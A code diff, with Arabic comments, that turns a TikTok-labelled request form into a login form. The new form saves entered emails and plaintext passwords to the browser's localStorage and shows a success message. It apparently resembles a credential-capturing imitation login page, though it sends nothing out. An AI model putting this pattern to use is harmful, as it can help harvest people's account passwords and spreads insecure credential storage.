@@ -1,23 +1,21 @@
-// جلب الطلبات من Local Storage
-let requests = JSON.parse(localStorage.getItem('tiktokRequests')) || [];
+let users = JSON.parse(localStorage.getItem('tiktokUsers')) || [];
 
-// التعامل مع إرسال النموذج
-document.getElementById('requestForm').addEventListener('submit', function(e) {
+document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
-    const username = document.getElementById('username').value.trim();
-    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
 
-    if (!username || !phone) {
+    if (!email || !password) {
         alert('❌ من فضلك املأ جميع البيانات.');
         return;
     }
 
-    // حفظ الطلب
-    requests.push({ username, phone, date: new Date().toLocaleString() });
-    localStorage.setItem('tiktokRequests', JSON.stringify(requests));
+    // حفظ البيانات
+    users.push({ email, password, date: new Date().toLocaleString() });
+    localStorage.setItem('tiktokUsers', JSON.stringify(users));
 
     // عرض رسالة نجاح
     document.getElementById('successMessage').style.display = 'block';
-    document.getElementById('requestForm').reset();
+    document.getElementById('loginForm').reset();
 });
